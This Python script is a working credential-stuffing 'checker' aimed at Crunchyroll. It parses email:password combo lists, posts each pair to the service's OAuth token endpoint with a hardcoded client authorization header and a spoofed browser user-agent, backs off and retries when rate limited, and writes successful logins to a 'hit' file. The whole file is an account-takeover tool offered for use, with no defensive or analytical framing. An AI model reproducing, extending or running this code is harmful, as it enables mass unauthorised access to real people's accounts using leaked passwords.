#!/usr/bin/env python3


### Importing
from urllib import (
    request,
    parse,
    error
)
import re
import json
import time


### Some Global Variable
regexEmailPassCombo = '[\w\.]+@[\w\.]+:[\S]+'


### Checker Class
class CrunchyrollChecker:

    def __init__(self, filename):
        self.apiUrl = "https://beta-api.crunchyroll.com/"
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        self.auth = "Basic aHJobzlxM2F3dnNrMjJ1LXRzNWE6cHROOURteXRBU2Z6QjZvbXVsSzh6cUxzYTczVE1TY1k="
        self.data = {
            "grant_type": "password",
            "scope": "offline_access"
        }
        self.filename = filename
    
    @classmethod
    def create(
        cls,
        filename : str
        ):
        self = CrunchyrollChecker(filename)
        self._resultFile()
        self._checker()

    def _checker(self):
        file = open(self.filename)
        for line in file.readlines():
            loginDetail = self._filterEmailPass(line)
            if loginDetail:
                self._tryToLogin()
            else:
                continue
        file.close()
        self.hitFile.close()
        self.invalid.close()
    
    def _makeRequest(
        self,
        url : str,
        headers : dict = None,
        data : dict = None
        ):
        data = parse.urlencode(data).encode()
        req = request.Request(
            url,
            headers = headers,
            data = data
        )
        try:
            self.res = request.urlopen(req)
        except error.HTTPError as e:
            if e.code == 401:
                print(f'{self.email}:{self.password} Wrong!')
            elif e.code == 429:
                print("Too many Requests, Let me take a sleep for 10 seconds.")
                time.sleep(10)
                self._tryToLogin()
            else:
                print(e)
            self._resultSaving()
        except Exception as e:
            print(e)
            self._resultSaving()
        else:
            self.res = self.res.read()
            self.res = self.res.decode('utf-8')
            self.res = json.loads(self.res)
            if self.res['access_token']:
                print(f'{self.email}:{self.password} Hit Found!')
                # print(self.res)
                self._resultSaving(result = True)
            else:
                print(f'{self.email}:{self.password} Something went wrong!')
                print(self.res)
                self._resultSaving()
    
    def _tryToLogin(self):
        data = dict(self.data)
        data['username'] = self.email
        data['password'] = self.password
        headers = dict(self.headers)
        headers["authorization"] = self.auth
        self._makeRequest(
            self.apiUrl + "auth/v1/token",
            headers,
            data
        )
    
    def _filterEmailPass(self, line):
        loginDetail = re.findall(regexEmailPassCombo, line)
        if loginDetail:
            self.email, self.password = loginDetail[0].split(':')
            return True
        else:
            return None
    
    def _resultFile(self):
        resultDir = 'result//'
        self.hitFile = open(f'{resultDir}hit.txt', 'a')
        self.invalid = open(f'{resultDir}invalid.txt', 'a')

    def _resultSaving(self, result = None):
        if result:
            self.hitFile.write(f'{self.email}:{self.password}' + '\n')
            self.hitFile.flush()
        else:
            self.invalid.write(f'{self.email}:{self.password}' + '\n')
            self.invalid.flush()

